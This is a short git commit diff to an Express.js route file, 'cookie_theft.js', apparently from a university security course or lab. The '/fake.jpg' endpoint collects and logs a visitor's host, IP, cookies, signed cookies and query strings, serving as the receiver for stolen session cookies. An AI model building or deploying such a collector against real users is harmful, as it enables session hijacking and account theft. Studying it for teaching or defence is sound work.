e0e8f8fb08d20c0adef48f2fa1e03fc276df6075
Kaicheng Tan <tan95@cs.washington.edu>
2017-05-09 16:13:13 -0700

    ++++

--- routes/cookie_theft.js
+++ routes/cookie_theft.js
@@ -3,8 +3,10 @@ var router = express.Router();
 const path = require('path');
 
 router.get('/fake.jpg', function(req, res, next) {
-  console.log('\n\nCookie received by cookie theft:');
-  console.log(JSON.stringify(req.cookies, null, 2));
+  console.log('\n\n');
+  console.log('Host:', req.hostname, ', ', req.ip);
+  console.log('Cookie received by cookie theft:');
+  console.log(JSON.stringify(req.cookies, null, 2), '\n', JSON.stringify(req.signedCookies, null, 2));
   console.log('Query Strings:');
   console.log(JSON.stringify(req.query, null, 2));
   // res.send('Your cookie is parsed :)');
